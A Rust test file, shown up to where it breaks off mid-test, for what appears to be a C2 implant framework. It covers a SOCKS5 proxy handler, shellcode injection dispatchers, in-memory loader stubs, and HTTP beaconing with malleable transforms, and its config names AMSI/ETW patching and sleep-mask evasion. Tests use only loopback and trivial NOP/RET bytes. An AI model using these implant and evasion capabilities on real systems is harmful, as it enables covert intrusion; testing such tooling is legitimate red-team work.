// tests/test_w3_coverage.rs - Wave 3 subsystem coverage //
// Subsystems: socks, pivot (round-trip/garbage; listener tests stay in
// test_pivot.rs), migrate, inmem, injection (linux + windows stubs), pki,
// http_transport.
//
// Everything here runs on a linux host without windows targets, external
// network, or root. The only sockets used are loopback listeners created
// by the tests themselves. Genuinely untestable seams (windows-only PE
// parsing nested in cfg(windows) private fns, live injection) are
// documented in the wave-3 report instead of being theater-tested.

use rcm::common::{
    C2Config, CommandResponse, FallbackConfig, MalleableProfile, ProxyConfig,
    TransportProtocol,
};

// ── shared helpers ────────────────────────────────────────────────────

/// Full-field C2Config (same pattern as tests/test_transport.rs).
fn make_config(host: &str, port: u16, transport: TransportProtocol) -> C2Config {
    C2Config {
        transport,
        profile: MalleableProfile::default(),
        proxy: ProxyConfig::default(),
        fallback: FallbackConfig::default(),
        server_public_key: String::new(),
        hash_salt: String::new(),
        c2_host: host.into(),
        build_id: "test".into(),
        tunnel_port: port,
        sleep_interval: 5,
        jitter_min: 0,
        jitter_max: 0,
        bloat_mb: 0,
        debug: false,
        kill_date: None,
        challenge_key: String::new(),
        sni_override: None,
        alpn_protocols: vec![],
        hibernation_mode: false,
        task_batch_size: 10,
        dga: None,
        valid_parents: Vec::new(),
        sleep_mask: "ekko".to_string(),
        indirect_syscalls: true,
        stack_spoof: true,
        patch_amsi_etw: true,
        heap_encrypt: true,
        guard_domain: String::new(),
        guard_hostname: String::new(),
        guard_hour_start: 0,
        guard_hour_end: 0,
        guard_no_system: false,
        auto_pivot_port: None,
    }
}

fn resp(id: u64, out: &str) -> CommandResponse {
    CommandResponse { request_id: id, output: out.to_string(), error: String::new(), exit_code: 0 }
}

// ── 1. socks ──────────────────────────────────────────────────────────
//
// handle_socks5_stream is generic over the stream, so the full protocol
// flow is driven through an in-memory duplex; only the outbound target
// connection uses loopback TCP.

mod socks {
    use tokio::io::{AsyncReadExt, AsyncWriteExt, DuplexStream};
    use tokio::time::{timeout, Duration};

    const T: Duration = Duration::from_secs(10);

    fn greeting() -> Vec<u8> { vec![0x05, 0x01, 0x00] }

    fn request(cmd: u8, atyp: u8, addr: &[u8], port: u16) -> Vec<u8> {
        let mut v = vec![0x05, cmd, 0x00, atyp];
        v.extend_from_slice(addr);
        v.extend_from_slice(&port.to_be_bytes());
        v
    }

 /// Run the handler on a dedicated OS thread with a current_thread
 /// runtime. tokio::spawn cannot be used: the handler's error type is
 /// Box<dyn Error> (!Send), so its future must stay on one thread -
 /// exactly how production consumes it inline (handlers/network.rs).
    fn run_handler() -> (DuplexStream, std::thread::JoinHandle<Result<(), String>>) {
        let (client, server) = tokio::io::duplex(4096);
        let h = std::thread::spawn(move || {
            let rt = tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
                .unwrap();
            rt.block_on(rcm::socks::handle_socks5_stream(server))
                .map_err(|e| e.to_string())
        });
        (client, h)
    }

 /// Join the handler thread, bounded: a handler that cannot terminate
 /// must fail the test fast instead of stalling the whole suite.
    async fn wait(h: std::thread::JoinHandle<Result<(), String>>) -> Result<(), String> {
        timeout(T, tokio::task::spawn_blocking(move || h.join().unwrap()))
            .await
            .expect("handler did not terminate within the test timeout")
            .unwrap()
    }

    #[tokio::test]
    async fn wrong_version_is_rejected() {
        let (mut c, h) = run_handler();
        c.write_all(&[0x04, 0x01, 0x00]).await.unwrap();
        let r = wait(h).await;
        assert!(r.is_err());
        assert!(r.unwrap_err().to_string().contains("Not SOCKS5"));
    }

    #[tokio::test]
    async fn handshake_replies_no_auth() {
        let (mut c, h) = run_handler();
        c.write_all(&greeting()).await.unwrap();
        let mut buf = [0u8; 2];
        timeout(T, c.read_exact(&mut buf)).await.unwrap().unwrap();
        assert_eq!(buf, [0x05, 0x00], "no-auth handshake reply");
        drop(c);
        let _ = wait(h).await;
    }

    #[tokio::test]
    async fn unsupported_command_is_rejected() {
        let (mut c, h) = run_handler();
        c.write_all(&greeting()).await.unwrap();
        let mut buf = [0u8; 2];
        timeout(T, c.read_exact(&mut buf)).await.unwrap().unwrap();
 // cmd 0x02 = BIND (only CONNECT is supported)
        c.write_all(&request(0x02, 0x01, &[127, 0, 0, 1], 80)).await.unwrap();
        let r = wait(h).await;
        assert!(r.unwrap_err().to_string().contains("Unsupported SOCKS command"));
    }

    #[tokio::test]
    async fn unsupported_atyp_is_rejected() {
        let (mut c, h) = run_handler();
        c.write_all(&greeting()).await.unwrap();
        let mut buf = [0u8; 2];
        timeout(T, c.read_exact(&mut buf)).await.unwrap().unwrap();
        c.write_all(&request(0x01, 0x05, &[0, 0, 0, 0], 80)).await.unwrap();
        let r = wait(h).await;
        assert!(r.unwrap_err().to_string().contains("Unsupported Address Type"));
    }

    #[tokio::test]
    async fn truncated_greeting_errors_instead_of_hanging() {
        let (mut c, h) = run_handler();
        c.write_all(&[0x05]).await.unwrap();
        drop(c); // EOF mid-read
        let r = wait(h).await;
        assert!(r.is_err(), "short read must surface an error");
    }

    #[tokio::test]
    async fn truncated_request_errors_instead_of_hanging() {
        let (mut c, h) = run_handler();
        c.write_all(&greeting()).await.unwrap();
        let mut buf = [0u8; 2];
        timeout(T, c.read_exact(&mut buf)).await.unwrap().unwrap();
        c.write_all(&[0x05, 0x01]).await.unwrap(); // half a request header
        drop(c);
        let r = wait(h).await;
        assert!(r.is_err());
    }

    #[tokio::test]
    async fn ipv4_connect_success_then_pipes_bytes() {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();

        let (mut c, h) = run_handler();
        c.write_all(&greeting()).await.unwrap();
        c.write_all(&request(0x01, 0x01, &[127, 0, 0, 1], port)).await.unwrap();

        let mut buf = [0u8; 2];
        timeout(T, c.read_exact(&mut buf)).await.unwrap().unwrap();
        assert_eq!(buf, [0x05, 0x00]);

 // Success reply: 10 bytes, rep 0x00.
        let mut rep = [0u8; 10];
        timeout(T, c.read_exact(&mut rep)).await.unwrap().unwrap();
        assert_eq!(rep[0], 0x05);
        assert_eq!(rep[1], 0x00, "CONNECT must report success");

 // The proxied byte stream works in both directions.
        let (mut upstream, _) = timeout(T, listener.accept()).await.unwrap().unwrap();
        c.write_all(b"ping").await.unwrap();
        let mut got = [0u8; 4];
        timeout(T, upstream.read_exact(&mut got)).await.unwrap().unwrap();
        assert_eq!(&got, b"ping", "client->target piping");
        upstream.write_all(b"pong").await.unwrap();
        timeout(T, c.read_exact(&mut got)).await.unwrap().unwrap();
        assert_eq!(&got, b"pong", "target->client piping");

        drop(c);
        drop(upstream);
        let r = wait(h).await;
        assert!(r.is_ok(), "clean close must end the handler without error");
    }

    #[tokio::test]
    async fn domain_atyp_resolves_and_connects() {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();

        let (mut c, h) = run_handler();
        c.write_all(&greeting()).await.unwrap();
        let mut addr = vec![9u8]; // len-prefixed "localhost"
        addr.extend_from_slice(b"localhost");
        c.write_all(&request(0x01, 0x03, &addr, port)).await.unwrap();

        let mut buf = [0u8; 2];
        timeout(T, c.read_exact(&mut buf)).await.unwrap().unwrap();
        let mut rep = [0u8; 10];
        timeout(T, c.read_exact(&mut rep)).await.unwrap().unwrap();
        assert_eq!(rep[1], 0x00, "domain address must resolve and connect: {:?}", rep);

 // Accept the handler's target connection and close it right away:
 // otherwise the kernel-completed handshake sits in the backlog
 // forever and the handler's target->client pipe never sees EOF.
        let accept = tokio::spawn(async move {
            let _accepted = timeout(T, listener.accept()).await.unwrap().unwrap();
 // dropped here: the handler's target side sees FIN
        });
        drop(c);
        let r = wait(h).await;
        assert!(r.is_ok(), "clean close must end the handler without error");
        accept.await.unwrap();
    }

    #[tokio::test]
    async fn ipv6_atyp_connects_when_stack_available() {
 // Environment-dependent: needs a working ::1. Skip (with a note)
 // where the v6 loopback cannot be bound, e.g. minimal containers.
        let listener = match tokio::net::TcpListener::bind("[::1]:0").await {
            Ok(l) => l,
            Err(_) => { eprintln!("skip: no ipv6 loopback in this environment"); return; }
        };
        let port = listener.local_addr().unwrap().port();

        let (mut c, h) = run_handler();
        c.write_all(&greeting()).await.unwrap();
        c.write_all(&request(0x01, 0x04, &[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1], port)).await.unwrap();

        let mut buf = [0u8; 2];
        timeout(T, c.read_exact(&mut buf)).await.unwrap().unwrap();
        let mut rep = [0u8; 10];
        timeout(T, c.read_exact(&mut rep)).await.unwrap().unwrap();
        assert_eq!(rep[1], 0x00, "ipv6 CONNECT must succeed: {:?}", rep);

 // Accept and close the target connection so the handler's pipe
 // terminates (same never-accepted-listener hang as the v4/domain
 // cases would otherwise have).
        let accept = tokio::spawn(async move {
            let _accepted = timeout(T, listener.accept()).await.unwrap().unwrap();
        });
        drop(c);
        let r = wait(h).await;
        assert!(r.is_ok(), "clean close must end the handler without error");
        accept.await.unwrap();
    }

    #[tokio::test]
    async fn connect_failure_reports_host_unreachable() {
 // Port 1 is privileged and never bound: a reliable refused-connect.
        let (mut c, h) = run_handler();
        c.write_all(&greeting()).await.unwrap();
        c.write_all(&request(0x01, 0x01, &[127, 0, 0, 1], 1)).await.unwrap();

        let mut buf = [0u8; 2];
        timeout(T, c.read_exact(&mut buf)).await.unwrap().unwrap();
        let mut rep = [0u8; 10];
        timeout(T, c.read_exact(&mut rep)).await.unwrap().unwrap();
        assert_eq!(rep[0], 0x05);
        assert_eq!(rep[1], 0x04, "refused connect must map to host-unreachable");
        let r = wait(h).await;
        assert!(r.is_err(), "handler must also return the io error");
    }
}

// ── 3. migrate ────────────────────────────────────────────────────────
//
// The PE header-walking helpers (rd_u16/32/64, section walking) are
// nested fns inside cfg(target_os = "windows") modules: they do not exist
// in a linux build at all, so they cannot be unit-tested here without
// src changes. What IS real on linux: read_self and the honest errors of
// the windows-only paths.

mod migrate {
    #[test]
    fn read_self_returns_current_executable() {
        let bytes = rcm::agent::migrate::read_self().expect("read_self must read the test binary");
        assert!(bytes.len() > 4, "executable image must be non-trivial");
        assert_eq!(&bytes[..4], b"\x7fELF", "on linux the self image is an ELF");
    }

    #[test]
    fn migrate_inject_is_honest_about_windows_only() {
 // Read-self succeeds on linux, then the injection half reports
 // that it needs windows. The exact message is the contract.
        let err = rcm::agent::migrate::migrate_inject(1234).unwrap_err();
        assert!(
            err.contains("requires Windows"),
            "unexpected message: {}", err
        );
    }

 // migrate_spawn is deliberately NOT tested: on linux it fork/exec's a
 // copy of the current executable, which for a test binary means
 // re-running the whole test suite in a child process.
}

// ── 4. inmem ──────────────────────────────────────────────────────────
//
// On linux only the honest-stub modules exist (pe_loader, bof, dotnet);
// the loader internals are cfg(windows). The contract being pinned here:
// the stubs exist, return Err (never panic), and say why.

mod inmem {
    #[test]
    fn pe_loader_stub_reports_windows_only() {
        let err = unsafe { rcm::agent::inmem::pe_loader::load_pe(b"\x4d\x5a") }.unwrap_err();
        assert!(err.contains("Windows"), "unexpected: {}", err);
    }

    #[test]
    fn bof_stub_reports_windows_only() {
        let err = unsafe { rcm::agent::inmem::bof::run_bof(b"\x90", b"") }.unwrap_err();
        assert!(err.contains("Windows"), "unexpected: {}", err);
    }

    #[test]
    fn dotnet_stub_reports_windows_only() {
        let err = unsafe {
            rcm::agent::inmem::dotnet::run_assembly("a.dll", "T", "M", "arg", "v4")
        }.unwrap_err();
        assert!(err.contains("Windows"), "unexpected: {}", err);
    }
}

// ── 5. injection ──────────────────────────────────────────────────────
//
// Linux-testable seams: the empty-shellcode guards on every dispatcher,
// the windows-only errors of the windows strategies, ptrace attach
// failure against a nonexistent pid (no root needed: ESRCH), spawn
// failure for a nonexistent binary, and self-injection with a RET sled.

mod injection {
    use rcm::agent::injection;

    const SC: &[u8] = b"\x90\x90\xc3";

    #[test]
    fn empty_shellcode_rejected_by_every_dispatcher() {
        let cases: Vec<(&str, Result<String, String>)> = vec![
            ("apc",        injection::inject_remote_apc(1, &[])),
            ("thread",     injection::inject_remote_create_thread(1, &[])),
            ("advanced",   injection::inject_spawn_advanced("x.exe", 0, &[])),
            ("stomping",   injection::inject_module_stomping(1, "ntdll.dll", &[])),
            ("stomp_auto", injection::inject_module_stomping_auto(1, &[])),
            ("hijack",     injection::inject_remote_hijack(1, &[])),
            ("bird",       injection::inject_spawn_early_bird("x.exe", &[])),
            ("self",       injection::inject_self(&[])),
        ];
        for (name, res) in cases {
            let err = res.unwrap_err();
            assert!(err.contains("empty"), "{}: guard message was: {}", name, err);
        }
    }

    #[test]
    fn windows_strategies_report_windows_only_on_linux() {
        let cases: Vec<(&str, Result<String, String>)> = vec![
            ("apc",        injection::inject_remote_apc(1, SC)),
            ("thread",     injection::inject_remote_create_thread(1, SC)),
            ("advanced",   injection::inject_spawn_advanced("x.exe", 0, SC)),
            ("stomping",   injection::inject_module_stomping(1, "ntdll.dll", SC)),
            ("stomp_auto", injection::inject_module_stomping_auto(1, SC)),
        ];
        for (name, res) in cases {
            let err = res.unwrap_err();
            assert!(
                err.contains("Windows"),
                "{}: expected a windows-only error, got: {}", name, err
            );
        }
    }

    #[test]
    fn ptrace_attach_to_nonexistent_pid_fails_cleanly() {
 // No root required: attaching to a pid that does not exist fails
 // with ESRCH regardless of privileges.
        let err = injection::inject_remote_hijack(99_999_999, SC).unwrap_err();
        assert!(err.contains("attach"), "unexpected: {}", err);
    }

    #[test]
    fn early_bird_nonexistent_binary_fails_at_spawn() {
 // Spawn happens before any injection machinery: a bad path must
 // surface the spawn error, not a bogus success.
        let err = injection::inject_spawn_early_bird("/nonexistent/definitely-not-here.bin", SC)
            .unwrap_err();
        assert!(!err.is_empty());
        assert!(!err.contains("Windows"), "spawn error expected, got: {}", err);
    }

    #[test]
    fn self_injection_with_ret_sled_runs_or_reports_kernel_policy() {
 // A single RET byte: the spawned thread returns immediately. On
 // kernels that deny anonymous PROT_EXEC mmap (selinux execmem),
 // the honest error is "mmap failed" - both outcomes prove the
 // path behaves instead of crashing.
        match injection::inject_self(&[0xC3u8]) {
            Ok(msg) => assert!(msg.contains("spawned"), "unexpected: {}", msg),
            Err(e) => assert!(e.contains("mmap failed"), "unexpected: {}", e),
        }
    }
}

// ── 6. pki ────────────────────────────────────────────────────────────
//
// src/pki.rs only builds rustls configs from caller-supplied bytes; cert
// generation happens in build.rs (placeholder certs) and gen_certs.sh.
// The PEM below is a throwaway P-256 CA + leaf generated for this test
// (openssl), plus DER keys, matching what the production callers pass.
// "Fingerprint stability" is not a concept in this file - there is no
// fingerprint code here - so the wrong-file error paths are covered
// instead.

mod pki {
    const CA_CRT: &str = "
-----BEGIN CERTIFICATE-----
MIIBgTCCASegAwIBAgIUeEevcJJLTDkNA6UCYEsdce/rxzcwCgYIKoZIzj0EAwIw
FjEUMBIGA1UEAwwLUkNNIFRlc3QgQ0EwHhcNMjYwODI5MTQxMDQ4WhcNMzYwODI2
MTQxMDQ4WjAWMRQwEgYDVQQDDAtSQ00gVGVzdCBDQTBZMBMGByqGSM49AgEGCCqG
SM49AwEHA0IABPBBlZdjrSy3+8m8LXwA7i1ao6RkEqSITiZUJgK+gRZXrGI5IPKi
hWrREEpxVJVzkA93l65O7adsxgJvrBiCjNyjUzBRMB0GA1UdDgQWBBRFdJUoFZZi
qOJNEieS/rB2NditNTAfBgNVHSMEGDAWgBRFdJUoFZZiqOJNEieS/rB2NditNTAP
BgNVHRMBAf8EBTADAQH/MAoGCCqGSM49BAMCA0gAMEUCIHYqv9YbAVqaJhdxQXrg
iTcdCpaT7GpPbDzkI+dy4ALVAiEAptgT4jH1l0Lh15IPwjyc80hk9rdzOOmliyEf
eSHMFpU=
-----END CERTIFICATE-----
";

    const SERVER_CRT: &str = "
-----BEGIN CERTIFICATE-----
MIIBKDCB0QIUCNNmP3+QSc2eh6+etSaC/hu3FhEwCgYIKoZIzj0EAwIwFjEUMBIG
A1UEAwwLUkNNIFRlc3QgQ0EwHhcNMjYwODI5MTQxMDQ4WhcNMzYwODI2MTQxMDQ4
WjAaMRgwFgYDVQQDDA9yY20tdGVzdC1zZXJ2ZXIwWTATBgcqhkjOPQIBBggqhkjO
PQMBBwNCAASM44aEE/uMr/8oBC7I6hE2p4OjxP3767Dsb6jBBzmJgSO9+NHkhGBZ
4mvCw1B/pZvlahpu5cCK0FgHRfZXqk0CMAoGCCqGSM49BAMCA0YAMEMCIEFSvv6I
peTYN6kZvAH2HkG4A0WOUyLUsw0MpupzXMAjAh8THE9H37C+myRofBMf0a6iPuV1
Wu0396wFByWgI51K
-----END CERTIFICATE-----
";

 // PKCS#8 DER for SERVER_CRT's key and an unrelated key.
    const SERVER_KEY_DER: &[u8] = &[48,129,135,2,1,0,48,19,6,7,42,134,72,206,61,2,1,6,8,42,134,72,
        206,61,3,1,7,4,109,48,107,2,1,1,4,32,167,181,100,11,7,42,163,6,212,40,128,157,51,141,50,14,
        81,205,10,160,224,12,97,33,77,174,111,153,245,24,69,8,161,68,3,66,0,4,140,227,134,132,19,
        251,140,175,255,40,4,46,200,234,17,54,167,131,163,196,253,251,235,176,236,111,168,193,7,57,
        137,129,35,189,248,209,228,132,96,89,226,107,194,195,80,127,165,155,229,106,26,110,229,192,
        138,208,88,7,69,246,87,170,77,2];

    const OTHER_KEY_DER: &[u8] = &[48,129,135,2,1,0,48,19,6,7,42,134,72,206,61,2,1,6,8,42,134,72,
        206,61,3,1,7,4,109,48,107,2,1,1,4,32,195,130,161,138,153,154,9,143,68,120,174,40,69,218,136,
        251,67,129,18,9,183,221,34,180,73,222,1,28,3,122,219,3,161,68,3,66,0,4,61,45,72,187,84,241,
        170,32,23,216,131,175,15,55,216,101,135,24,64,6,220,113,104,180,239,190,214,39,12,140,77,
        167,245,136,225,131,235,66,179,67,185,234,59,61,15,92,60,211,195,168,98,199,33,15,196,138,
        177,73,186,108,65,165,208,218];

    #[test]
    fn client_config_accepts_valid_triple() {
        rcm::pki::create_client_config(CA_CRT.as_bytes(), SERVER_CRT.as_bytes(), SERVER_KEY_DER)
            .expect("valid CA + cert + matching DER key must build a client config");
    }

    #[test]
    fn server_config_accepts_valid_triple() {
        rcm::pki::create_server_config(SERVER_CRT.as_bytes(), SERVER_KEY_DER, CA_CRT.as_bytes())
            .expect("valid cert + matching DER key + CA must build a server config");
    }

    #[test]
    fn garbage_client_cert_defers_rejection_to_handshake() {
 // rustls-pemfile 1.0 yields an empty chain for non-PEM input and
 // rustls 0.21 does not reject an empty chain at config-build
 // time; the failure surfaces at the first handshake (no client
 // cert to present). Same deferred pattern as the CA case below.
 // Pinned as current behavior: eager validation would be a
 // hardening change in pki.rs, not a test fix.
        let r = rcm::pki::create_client_config(CA_CRT.as_bytes(), b"not a pem", SERVER_KEY_DER);
        assert!(r.is_ok(), "current behavior: empty chain still builds");
    }

    #[test]
    fn mismatched_key_defers_rejection_to_handshake() {
 // rustls 0.21 parses the key (any_supported_type) but does not
 // verify that it pairs with the certificate at build time, for
 // either builder. The TLS handshake fails later when the key is
 // used. Pinned as current behavior; a fail-fast check in pki.rs
 // would be a deliberate hardening diff.
        let r = rcm::pki::create_server_config(SERVER_CRT.as_bytes(), OTHER_KEY_DER, CA_CRT.as_bytes());
        assert!(r.is_ok(), "current behavior: server config builds with a mismatched key");
        let r = rcm::pki::create_client_config(CA_CRT.as_bytes(), SERVER_CRT.as_bytes(), OTHER_KEY_DER);
        assert!(r.is_ok(), "current behavior: client config builds with a mismatched key");
    }

    #[test]
    fn garbage_key_is_rejected_at_build_time() {
 // Unlike the cert material, an unparseable key fails immediately
 // (any_supported_type maps to an error in both builders).
        let r = rcm::pki::create_client_config(CA_CRT.as_bytes(), SERVER_CRT.as_bytes(), b"not a key");
        assert!(r.is_err(), "unparseable private key must fail at build time");
        let r = rcm::pki::create_server_config(SERVER_CRT.as_bytes(), b"not a key", CA_CRT.as_bytes());
        assert!(r.is_err(), "unparseable private key must fail at build time");
    }

    #[test]
    fn garbage_ca_yields_empty_root_store_but_builds() {
 // rustls_pemfile::certs silently yields zero certs for non-PEM
 // input, and an empty root store is not rejected at build time.
 // Pinned here so a future hardening change is a deliberate diff.
        let r = rcm::pki::create_client_config(b"not a pem", SERVER_CRT.as_bytes(), SERVER_KEY_DER);
        assert!(r.is_ok(), "current behavior: empty root store still builds");
    }
}

// ── 7. http_transport ─────────────────────────────────────────────────
//
// Pure seams (body transforms, URI rotator, inbound/outbound classifiers)
// plus the register/poll/send_result state machine against a canned
// loopback HTTP server. No external network, no TLS (the client under
// test is a plain reqwest::Client; build_client's TLS path is exercised
// separately).

mod http_transport {
    use super::{make_config, resp};
    use rcm::agent::http_transport as ht;
    use rcm::common::{SecuredCommand, TransformStep, TransportProtocol, ClientHello};
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::time::{timeout, Duration};

    const T: Duration = Duration::from_secs(10);

 // -- pure seams ----------------------------------------------------

    #[test]
    fn body_transform_roundtrip_all_steps() {
        let steps = vec![
            TransformStep::Mask(b"k3y".to_vec()),
            TransformStep::Base64,
            TransformStep::Hex,
            TransformStep::Prepend("MAGIC:".into()),
            TransformStep::Append(":END".into()),
        ];
        let data = b"hello world, this is the payload".to_vec();
        let enc = ht::apply_body_transform(&data, &steps);
        assert_ne!(enc, data);
        let dec = ht::reverse_body_transform(&enc, &steps).unwrap();
        assert_eq!(dec, data);
    }

    #[test]
    fn body_transform_no_steps_is_identity() {
        let data = b"abc".to_vec();
        assert_eq!(ht::apply_body_transform(&data, &[]), data);
        assert_eq!(ht::reverse_body_transform(&data, &[]).unwrap(), data);
    }

    #[test]
    fn reverse_prepend_mismatch_is_an_error() {
        let steps = vec![TransformStep::Prepend("MAGIC:".into())];
        let r = ht::reverse_body_transform(b"WRONG:payload", &steps);
        assert!(r.unwrap_err().contains("Prepend Mismatch"));
    }

    #[test]
    fn reverse_append_mismatch_is_an_error() {
        let steps = vec![TransformStep::Append(":END".into())];
        let r = ht::reverse_body_transform(b"payload:WRONG", &steps);
        assert!(r.unwrap_err().contains("Append Mismatch"));
    }

    #[test]
    fn reverse_hex_rejects_garbage() {
        let steps = vec![TransformStep::Hex];
        assert!(ht::reverse_body_transform(b"zz not hex", &steps).is_err());
        assert!(ht::reverse_body_transform(b"abc", &steps).is_err(), "odd-length hex must fail");
    }

    #[test]
    fn mask_with_empty_key_is_noop() {
        let steps = vec![TransformStep::Mask(Vec::new())];
        let data = b"payload".to_vec();
        assert_eq!(ht::apply_body_transform(&data, &steps), data);
        assert_eq!(ht::reverse_body_transform(&data, &steps).unwrap(), data);
    }

    #[test]
    fn uri_rotator_defaults_and_stickiness() {
        let mut p = rcm::common::MalleableProfile::default();
 // HttpBlock::default() ships uris = ["/default"], so clear the
 // sets explicitly to exercise the rotator's empty-set fallback.
        p.http_get.uris = vec![];
        p.http_post.uris = vec![];
        let mut rot = ht::UriRotator::new();
 // Empty URI sets fall back to the built-in default.
        assert_eq!(rot.poll_uri(&p), "/api/v1/sync");
        assert_eq!(rot.result_uri(&p), "/api/v1/sync");
 // Advance is a no-op while the set is empty.
        rot.note_poll_ok(&p);
        assert_eq!(rot.poll_uri(&p), "/api/v1/sync");

        p.http_get.uris = vec!["/a".into(), "/b".into(), "/c".into()];
        p.http_post.uris = vec!["/x".into(), "/y".into()];
        assert_eq!(rot.poll_uri(&p), "/a");
        assert_eq!(rot.result_uri(&p), "/x");
 // URIs do not advance until success is reported (stickiness).
        assert_eq!(rot.poll_uri(&p), "/a");
        rot.note_poll_ok(&p);
        assert_eq!(rot.poll_uri(&p), "/b");
        rot.note_result_ok(&p);
        assert_eq!(rot.result_uri(&p), "/y");
        rot.note_poll_ok(&p);
        rot.note_poll_ok(&p);
        assert_eq!(rot.poll_uri(&p), "/a", "rotation must wrap");
        rot.note_result_ok(&p);
        assert_eq!(rot.result_uri(&p), "/x", "post rotation must wrap");
    }

    fn cmd(id: &str, n: u64) -> SecuredCommand {
        SecuredCommand {
            session_id: id.into(),
            counter: n,
            nonce: n * 7,
            timestamp: chrono::Utc::now(),
            command: format!("shell echo {}", n),
            signature: "sig".into(),
        }
    }

    #[test]
    fn split_inbound_separates_commands_and_pivot_frames() {
        let frame = rcm::common::PivotFrame {
            stream_id: 42,
            destination: 7,
            source: 42,
            data: b"\x01\x02".to_vec(),
            metadata: "init".into(),
        };
        let body = serde_json::to_string(&serde_json::json!([
            serde_json::to_value(&frame).unwrap(),
            serde_json::to_value(cmd("s1", 1)).unwrap(),
        ]))
        .unwrap();
        let batch = ht::split_inbound(body.as_bytes()).unwrap();
        assert_eq!(batch.pivot_frames.len(), 1);
        assert_eq!(batch.commands.len(), 1);
        assert_eq!(batch.pivot_frames[0].stream_id, 42);
        assert_eq!(batch.commands[0].command, "shell echo 1");
    }

    #[test]
    fn split_inbound_rejects_unrecognized_elements() {
        let err = ht::split_inbound(br#"[{"neither": "frame", "nor": "command"}]"#).unwrap_err();
        assert!(err.contains("Unrecognized element"), "got: {}", err);
    }

    #[test]
    fn split_inbound_rejects_non_array_body() {
        assert!(ht::split_inbound(b"<html>decoy</html>").is_err());
        assert!(ht::split_inbound(b"{}").is_err());
    }

    #[test]
    fn classify_outbound_distinguishes_pivot_from_result() {
        let frame = rcm::common::PivotFrame {
            stream_id: 1, destination: 2, source: 1, data: vec![9], metadata: String::new(),
        };
        let fb = serde_json::to_vec(&frame).unwrap();
        match ht::classify_outbound(&fb) {
            Some(ht::OutboundItem::Pivot(f)) => assert_eq!(f.stream_id, 1),
            _ => panic!("pivot frame must classify as Pivot"),
        }
        let rb = serde_json::to_vec(&resp(5, "out")).unwrap();
        match ht::classify_outbound(&rb) {
            Some(ht::OutboundItem::Result(r)) => assert_eq!(r.request_id, 5),
            _ => panic!("response must classify as Result"),
        }
        assert!(ht::classify_outbound(b"garbage").is_none());
    }

    #[test]
    fn base_url_respects_transport_scheme() {
        let http = make_config("10.0.0.5", 8080, TransportProtocol::Http);
        assert_eq!(ht::base_url(&http), "http://10.0.0.5:8080");
        let https = make_config("c2.example.com", 443, TransportProtocol::Https);
        assert_eq!(ht::base_url(&https), "https://c2.example.com:443");
    }

    #[test]
    fn build_client_rejects_bad_proxy_url() {
 // The embedded CA must parse first; in placeholder-cert builds it
 // is empty, so this test only runs where a real CA is embedded.
        let ca = std::fs::read(concat!(env!("CARGO_MANIFEST_DIR"), "/certs/ca.crt")).unwrap_or_default();
        if reqwest::Certificate::from_pem(&ca).is_err() {
            eprintln!("skip: embedded CA is a placeholder in this build");
            return;
        }
 // An explicit proxy URL is used whenever it is non-empty.
        let mut cfg = make_config("c2.example.com", 443, TransportProtocol::Https);
        cfg.proxy.url = "not a url".into();
        let err = ht::build_client(&cfg).unwrap_err();
        assert!(err.contains("Proxy URL"), "got: {}", err);
    }

    #[test]
    fn build_client_ok_with_valid_config() {
        let ca = std::fs::read(concat!(env!("CARGO_MANIFEST_DIR"), "/certs/ca.crt")).unwrap_or_default();
        if reqwest::Certificate::from_pem(&ca).is_err() {
            eprintln!("skip: embedded CA is a placeholder in this build");
            return;
        }
        let cfg = make_config("c2.example.com", 443, TransportProtocol::Https);
        ht::build_client(&cfg).expect("default config must build a client");
    }

 // -- canned loopback HTTP server -----------------------------------

 /// Accept `hits` connections, answer each with the same canned
 /// response, and collect the raw request bytes per connection.
    async fn canned_server(status: u16, body: Vec<u8>, hits: usize) -> (u16, tokio::task::JoinHandle<Vec<Vec<u8>>>) {
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();
        let join = tokio::spawn(async move {
            let mut requests = Vec::new();
            for _ in 0..hits {
                let (mut sock, _) = listener.accept().await.unwrap();
                let mut buf = Vec::new();
                let mut tmp = [0u8; 8192];
                let mut header_len = None;
                let mut content_len = 0usize;
                loop {
                    let n = sock.read(&mut tmp).await.unwrap();
                    if n == 0 { break; }
                    buf.extend_from_slice(&tmp[..n]);
                    if header_len.is_none() {
                        if let Some(pos) = buf.windows(4).position(|w| w == b"\r\n\r\n") {
                            header_len = Some(pos + 4);
                            let head = String::from_utf8_lossy(&buf[..pos]);
                            for line in head.lines() {
                                if line.to_ascii_lowercase().starts_with("content-length:") {
                                    content_len = line[15..].trim().parse().unwrap_or(0);
                                }
                            }
                        }
                    }
                    if let Some(hl) = header_len {
                        if buf.len() >= hl + content_len { break; }
                    }
                }
                let reason = match status { 200 => "OK", 404 => "Not Found", 500 => "Server Error", _ => "X" };
                let head = format!(
                    "HTTP/1.1 {} {}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                    status, reason, body.len()
                );
                sock.write_all(head.as_bytes()).await.unwrap();
                sock.write_all(&body).await.unwrap();
                let _ = sock.shutdown().await;
                requests.push(buf);
            }
            requests
        });
        (port, join)
    }

 /// Bounded await for the canned server: if the code under test made
 /// fewer connections than expected, fail fast instead of stalling
 /// the suite on an unbounded join.
    async fn collect(join: tokio::task::JoinHandle<Vec<Vec<u8>>>) -> Vec<Vec<u8>> {
        timeout(T, join).await.expect("canned server received fewer hits than expected").unwrap()
    }

    fn hello() -> ClientHello {
        ClientHello {
            hostname: "testhost".into(),
            os: "linux".into(),
            computer_id: "cid".into(),
            exe_id: "eid".into(),
            build_id: "bid".into(),
            auth_hmac: String::new(),
            reg_timestamp: "2026-01-01T00:00:00Z".into(),
            interfaces: vec![],
            hibernation_mode: false,
            task_batch_size: 10,
        }
    }

    #[tokio::test]
    async fn register_parses_token_and_commands() {
        let c1 = cmd("s1", 1);
        let c2 = cmd("s1", 2);
        let body = format!(
            "[\"tok-abc\",[{},{}]]",
            serde_json::to_string(&c1).unwrap(),
            serde_json::to_string(&c2).unwrap()
        );
        let (port, join) = canned_server(200, body.into_bytes(), 1).await;
        let client = reqwest::Client::new();
        let base = format!("http://127.0.0.1:{}", port);
